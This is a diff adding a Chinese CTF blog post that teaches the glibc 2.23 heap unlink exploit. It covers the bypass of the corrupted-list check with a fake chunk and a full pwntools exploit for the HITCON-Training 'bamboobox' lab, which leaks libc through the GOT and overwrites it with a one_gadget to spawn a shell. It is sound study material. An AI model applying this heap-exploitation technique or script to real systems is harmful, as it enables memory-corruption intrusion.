@@ -1,0 +1,1186 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon00.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="CTF-pwn中对于堆的很常见的利用手段之一就是unlink，对学习过程做个记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unlink学习">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;06&#x2F;unlink%E5%AD%A6%E4%B9%A0&#x2F;index.html">
+<meta property="og:site_name" content="N0vice&#39;s Blog">
+<meta property="og:description" content="CTF-pwn中对于堆的很常见的利用手段之一就是unlink，对学习过程做个记录">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;06&#x2F;unlink%E5%AD%A6%E4%B9%A0&#x2F;unlink1.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;06&#x2F;unlink%E5%AD%A6%E4%B9%A0&#x2F;unlink2.png">
+<meta property="article:published_time" content="2020-03-06T02:40:40.000Z">
+<meta property="article:modified_time" content="2020-03-06T14:29:45.538Z">
+<meta property="article:author" content="N0vice">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;06&#x2F;unlink%E5%AD%A6%E4%B9%A0&#x2F;unlink1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/06/unlink学习/"/>
+
+
+
+
+
+  <title>unlink学习 | N0vice's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.1.0"></head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
+<script src="/live2d-widget/autoload.js"></script>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">N0vice's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/06/unlink%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="N0vice">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="N0vice's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">unlink学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-06T10:40:40+08:00">
+                2020-03-06
+              </time>
+            
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>CTF-pwn中对于堆的很常见的利用手段之一就是unlink，对学习过程做个记录    <a id="more"></a>   </p>
+<pre><code>本文部分引用了其他师傅的文章原文，如有侵权，请联系我删除  </code></pre><h2 id="unlink简介"><a href="#unlink简介" class="headerlink" title="unlink简介"></a>unlink简介</h2><p>随便搜索就可以发现unlink的文章有很多，但是看了很久也不知道unlink是个什么东西。后来看了一篇文章之后才理解，简单来说Unlink这个行为就是将已经free的chunk从某bin里拿出来，并和刚刚free的chunk合并，重新放入某bin中。<br>放一张图片<br><img src="unlink1.jpg" alt=""><br>古老的unlink就是判断前后物理相邻的chunk是否处于使用状态，来判断是进行前向合并或后向合并，也就是设置   </p>
+<pre><code>P-&gt;fd-&gt;bk = P-&gt;bk.
+P-&gt;bk-&gt;fd = P-&gt;fd.</code></pre><h2 id="保护机制介绍与绕过姿势"><a href="#保护机制介绍与绕过姿势" class="headerlink" title="保护机制介绍与绕过姿势"></a>保护机制介绍与绕过姿势</h2><p>但是现在都0202年了，这么古老的技术没办法利用了<br>现在的unlink都加上了检查，我们还是以glibc2.23来说吧（不要问我为什么，因为2.23之后的东西我不会）<br>先贴个源码   </p>
+<pre><code class="C++"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) {                                            </span>
+    FD = P-&gt;fd;                                      
+    BK = P-&gt;bk;                                     
+    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))              
+      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  
+    <span class="keyword">else</span> {                                      
+        FD-&gt;bk = BK;                                  
+        BK-&gt;fd = FD;                                  
+        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;<span class="built_in">size</span>)                      
+            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) {              
+        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)          
+        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    
+          malloc_printerr (check_action,                      
+                   <span class="string">"corrupted double-linked list (not small)"</span>,    
+                   P, AV);                          
+            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) {                      
+                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                      
+                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              
+                <span class="keyword">else</span> {                                  
+                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  
+                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  
+                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  
+                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  
+                  }                                  
+              } <span class="keyword">else</span> {                                  
+                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              
+                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              
+              }                                      
+          }                                      
+      }                                          
+}  </code></pre>
+<p>这里的检查主要有两项：<br>①P–&gt;fd–&gt;bk = P–&gt;bk–&gt;fd = P，即当前chunk的下一块chunk的上一块chunk是否等于它本身，当前chunk的上一块chunk的下一块chunk是否等于它本身<br>②检查当前chunk的size字段与它相邻的下一块chunk中记录的pre_size是否一样<br>那么我们现在利用就需要绕过这些检测，实际上第二条检测是比较好绕过的，我们只要溢出到下一块chunk的prev_size改写它就可以绕过了<br>绕过检查我们可以在chunk中我们可以控制的区域伪造一个chunk，让P–&gt;fd–&gt;bk = P,P–&gt;bk–&gt;fd =P，也就是说让他最终指向我们伪造的chunk的开头位置就可以绕过检查了<br>我们设ptr是chunk的首地址，P为需要操作的chunk，那么，我们只要令P–&gt;fd = ptr - 0x18，P–&gt;bk = ptr - 0x10就可以了<br>大概是这样伪造<br><img src="unlink2.png" alt=""><br>构造完之后，我们会得到FD = P–&gt;fd = ptr - 0x18，BK = P–&gt;bk = ptr - 0x10，那FD的bk指针就是FD–&gt;BK = FD + 0x18 = ptr - 0x18 + 0x18 = ptr，同理BK的fd指针就是BK–&gt;fd = BK + 0x10 = ptr - 0x10 + 0x10 = ptr 这样就可以绕过检测，然后我们得到的最终结果就是ptr = ptr - 0x18，也就是说ptr指向了ptr-0x18的地址处<br>那我们从ptr开始写入0x18个a，然后跟上free_got，再把free_got改写成onegadget就可以getshell了  </p>
+<h2 id="bamboobox"><a href="#bamboobox" class="headerlink" title="bamboobox"></a>bamboobox</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><pre><code class="shell">[*] &#39;/home/N0vice/Desktop/HITCON-Training/LAB/lab11/bamboobox&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre>
+<p>开了canary和NX，问题不大<br>看一下那几个函数<br>main  </p>
+<pre><code class="C++"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>
+<span class="function"></span>{
+  _QWORD *v3; <span class="comment">// [rsp+8h] [rbp-18h]</span>
+  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span>
+  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span>
+
+  v5 = __readfsqword(<span class="number">0x28</span>u);
+  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);
+  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);
+  v3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);
+  *v3 = hello_message;
+  v3[<span class="number">1</span>] = goodbye_message;
+  ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">signed</span> __int64, _QWORD))*v3)(<span class="number">16L</span>L, <span class="number">0L</span>L);
+  <span class="keyword">while</span> ( <span class="number">1</span> )
+  {
+    menu();
+    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);
+    <span class="keyword">switch</span> ( atoi(&amp;buf) )
+    {
+      <span class="keyword">case</span> <span class="number">1</span>:
+        show_item(&amp;buf, &amp;buf);
+        <span class="keyword">break</span>;
+      <span class="keyword">case</span> <span class="number">2</span>:
+        add_item(&amp;buf, &amp;buf);
+        <span class="keyword">break</span>;
+      <span class="keyword">case</span> <span class="number">3</span>:
+        change_item(&amp;buf, &amp;buf);
+        <span class="keyword">break</span>;
+      <span class="keyword">case</span> <span class="number">4</span>:
+        remove_item(&amp;buf, &amp;buf);
+        <span class="keyword">break</span>;
+      <span class="keyword">case</span> <span class="number">5</span>:
+        ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *, <span class="keyword">char</span> *))v3[<span class="number">1</span>])(&amp;buf, &amp;buf);
+        <span class="built_in">exit</span>(<span class="number">0</span>);
+        <span class="keyword">return</span>;
+      <span class="keyword">default</span>:
+        <span class="built_in">puts</span>(<span class="string">"invaild choice!!!"</span>);
+        <span class="keyword">break</span>;
+    }
+  }
+}</code></pre>
+<p>show_item    </p>
+<pre><code class="C++"><span class="function"><span class="keyword">int</span> <span class="title">show_item</span><span class="params">()</span></span>
+<span class="function"></span>{
+  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span>
+
+  <span class="keyword">if</span> ( !num )
+    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No item in the box"</span>);
+  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )
+  {
+    <span class="keyword">if</span> ( qword_6020C8[<span class="number">2</span> * i] )
+      <span class="built_in">printf</span>(<span class="string">"%d : %s"</span>, i, qword_6020C8[<span class="number">2</span> * i]);
+  }
+  <span class="keyword">return</span> <span class="built_in">puts</span>(byte_401089);
+}</code></pre>
+<p>add_item   </p>
+<pre><code class="C++">__<span class="function">int64 <span class="title">add_item</span><span class="params">()</span></span>
+<span class="function"></span>{
+  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span>
+  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h]</span>
+  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span>
+  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span>
+
+  v4 = __readfsqword(<span class="number">0x28</span>u);
+  <span class="keyword">if</span> ( num &gt; <span class="number">99</span> )
+  {
+    <span class="built_in">puts</span>(<span class="string">"the box is full"</span>);
+  }
+  <span class="keyword">else</span>
+  {
+    <span class="built_in">printf</span>(<span class="string">"Please enter the length of item name:"</span>);
+    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);
+    v2 = atoi(&amp;buf);
+    <span class="keyword">if</span> ( !v2 )
+    {
+      <span class="built_in">puts</span>(<span class="string">"invaild length"</span>);
+      <span class="keyword">return</span> <span class="number">0L</span>L;
+    }
+    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )
+    {
+      <span class="keyword">if</span> ( !qword_6020C8[<span class="number">2</span> * i] )
+      {
+        *(&amp;itemlist + <span class="number">4</span> * i) = v2;
+        qword_6020C8[<span class="number">2</span> * i] = <span class="built_in">malloc</span>(v2);
+        <span class="built_in">printf</span>(<span class="string">"Please enter the name of item:"</span>);
+        *(qword_6020C8[<span class="number">2</span> * i] + <span class="built_in">read</span>(<span class="number">0</span>, qword_6020C8[<span class="number">2</span> * i], v2)) = <span class="number">0</span>;
+        ++num;
+        <span class="keyword">return</span> <span class="number">0L</span>L;
+      }
+    }
+  }
+  <span class="keyword">return</span> <span class="number">0L</span>L;
+}</code></pre>
+<p>change_item  </p>
+<pre><code class="C++"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">change_item</span><span class="params">()</span></span>
+<span class="function"></span>{
+  <span class="keyword">int</span> v0; <span class="comment">// ST08_4</span>
+  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-2Ch]</span>
+  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-20h]</span>
+  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+20h] [rbp-10h]</span>
+  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span>
+
+  v5 = __readfsqword(<span class="number">0x28</span>u);
+  <span class="keyword">if</span> ( num )
+  {
+    <span class="built_in">printf</span>(<span class="string">"Please enter the index of item:"</span>);
+    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);
+    v2 = atoi(&amp;buf);
+    <span class="keyword">if</span> ( qword_6020C8[<span class="number">2</span> * v2] )
+    {
+      <span class="built_in">printf</span>(<span class="string">"Please enter the length of item name:"</span>, &amp;buf);
+      <span class="built_in">read</span>(<span class="number">0</span>, &amp;nptr, <span class="number">8u</span>LL);
+      v0 = atoi(&amp;nptr);
+      <span class="built_in">printf</span>(<span class="string">"Please enter the new name of the item:"</span>, &amp;nptr);
+      *(qword_6020C8[<span class="number">2</span> * v2] + <span class="built_in">read</span>(<span class="number">0</span>, qword_6020C8[<span class="number">2</span> * v2], v0)) = <span class="number">0</span>;
+    }
+    <span class="keyword">else</span>
+    {
+      <span class="built_in">puts</span>(<span class="string">"invaild index"</span>);
+    }
+  }
+  <span class="keyword">else</span>
+  {
+    <span class="built_in">puts</span>(<span class="string">"No item in the box"</span>);
+  }
+  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;
+}</code></pre>
+<p>remove_item  </p>
+<pre><code class="C++"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">remove_item</span><span class="params">()</span></span>
+<span class="function"></span>{
+  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span>
+  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span>
+  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span>
+
+  v3 = __readfsqword(<span class="number">0x28</span>u);
+  <span class="keyword">if</span> ( num )
+  {
+    <span class="built_in">printf</span>(<span class="string">"Please enter the index of item:"</span>);
+    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);
+    v1 = atoi(&amp;buf);
+    <span class="keyword">if</span> ( qword_6020C8[<span class="number">2</span> * v1] )
+    {
+      <span class="built_in">free</span>(qword_6020C8[<span class="number">2</span> * v1]);
+      qword_6020C8[<span class="number">2</span> * v1] = <span class="number">0L</span>L;
+      *(&amp;itemlist + <span class="number">4</span> * v1) = <span class="number">0</span>;
+      <span class="built_in">puts</span>(<span class="string">"remove successful!!"</span>);
+      --num;
+    }
+    <span class="keyword">else</span>
+    {
+      <span class="built_in">puts</span>(<span class="string">"invaild index"</span>);
+    }
+  }
+  <span class="keyword">else</span>
+  {
+    <span class="built_in">puts</span>(<span class="string">"No item in the box"</span>);
+  }
+  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;
+}</code></pre>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>我们在chunk1中构造一个fake_chunk，通过change功能堆溢出修改chunk2的prev_size和size，最重要的是修改掉prev_in_use位，让程序认为chunk1被free了，再free掉chunk2就可以触发unlink，并且通过构造fake_chunk的fd和bk指针绕过unlink检查，使得ptr = ptr - 0x18，输入”a”*0x18 + atoi_got，那么chunk1的指针会指向atoi_got，调用show函数的时候会泄露atoi的真实地址，然后构造出onegadget，将got改写为onegadget就可以getshell  </p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="Python"><span class="comment">#!/usr/bin/python2.7</span>
+<span class="comment">#coding=utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span>*
+<span class="comment">#context.log_level = 'debug'</span>
+context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
+context.arch = <span class="string">'amd64'</span>
+<span class="comment">#p=remote("node3.buuoj.cn",29168)</span>
+p = process(<span class="string">"./bamboobox"</span>)
+elf = ELF(<span class="string">"./bamboobox"</span>)
+libc = elf.libc
+<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span>
+    p.recvuntil(<span class="string">"choice:"</span>)
+    p.sendline(<span class="string">"2"</span>)
+    p.recvuntil(<span class="string">"name:"</span>)
+    p.send(str(size))
+    p.recvuntil(<span class="string">"item:"</span>)
+    p.send(content)
+<span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span>
+    p.recvuntil(<span class="string">"choice:"</span>)
+    p.sendline(<span class="string">"3"</span>)
+    p.recvuntil(<span class="string">"item:"</span>)
+    p.send(str(idx))
+    p.recvuntil(<span class="string">"name:"</span>)
+    p.send(str(size))
+    p.recvuntil(<span class="string">"item:"</span>)
+    p.send(content)
+<span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span>
+    p.recvuntil(<span class="string">"choice:"</span>)
+    p.sendline(<span class="string">"1"</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span>
+    p.recvuntil(<span class="string">"choice:"</span>)
+    p.sendline(<span class="string">"4"</span>)
+    p.recvuntil(<span class="string">"item:"</span>)
+    p.send(str(idx))
+
+<span class="comment">#gdb.attach(p,"b *0x400ED2")</span>
+add(<span class="number">0x80</span>,<span class="string">"aaaaaaaa"</span>)  <span class="comment"># chunk1</span>
+add(<span class="number">0x80</span>,<span class="string">"bbbbbbbb"</span>)  <span class="comment"># chunk2</span>
+payload = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) <span class="comment"># fake_chunk's prev_size and size</span>
+payload += p64(<span class="number">0x6020c8</span><span class="number">-0x18</span>) + p64(<span class="number">0x6020c8</span><span class="number">-0x10</span>) <span class="comment"># fake_chunk's fd and bk</span>
+payload += <span class="string">"a"</span>*<span class="number">0x60</span>  <span class="comment"># 填充完剩下的空间</span>
+payload += p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)  <span class="comment"># overwrite chunk2</span>
+
+edit(<span class="number">0</span>,len(payload),payload)
+free(<span class="number">1</span>)
+
+payload = <span class="string">"a"</span>*<span class="number">0x18</span> + p64(elf.got[<span class="string">'atoi'</span>])
+edit(<span class="number">0</span>,len(payload),payload)
+show() <span class="comment"># leak atoi_addr</span>
+
+atoi_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))
+log.success(<span class="string">"atoi_addr==&gt;"</span> + hex(atoi_addr))
+libc_base = atoi_addr - libc.sym[<span class="string">'atoi'</span>]
+onegadget = libc_base + <span class="number">0xf02a4</span>
+edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(onegadget))
+
+p.interactive()</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h2><p><a href="http://eternalsakura13.com/2018/03/01/unlink1/" target="_blank" rel="noopener">http://eternalsakura13.com/2018/03/01/unlink1/</a><br><a href="https://xz.aliyun.com/t/5748#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/5748#toc-0</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/</a><br><a href="https://www.jianshu.com/p/09a475864b6e" target="_blank" rel="noopener">https://www.jianshu.com/p/09a475864b6e</a><br><a href="https://www.cnblogs.com/luoleqi/p/12373298.html" target="_blank" rel="noopener">https://www.cnblogs.com/luoleqi/p/12373298.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的鼓励将支持我继续努力！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="N0vice 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="N0vice 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    N0vice
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2020/03/06/unlink%E5%AD%A6%E4%B9%A0/" title="unlink学习">http://yoursite.com/2020/03/06/unlink%E5%AD%A6%E4%B9%A0/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/29/V-N%E6%8B%9B%E6%96%B0%E8%B5%9Bpwn/" rel="next" title="V&N招新赛pwn">
+                <i class="fa fa-chevron-left"></i> V&N招新赛pwn
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/17/off-by-one%E5%AD%A6%E4%B9%A0/" rel="prev" title="off-by-one学习">
+                off-by-one学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
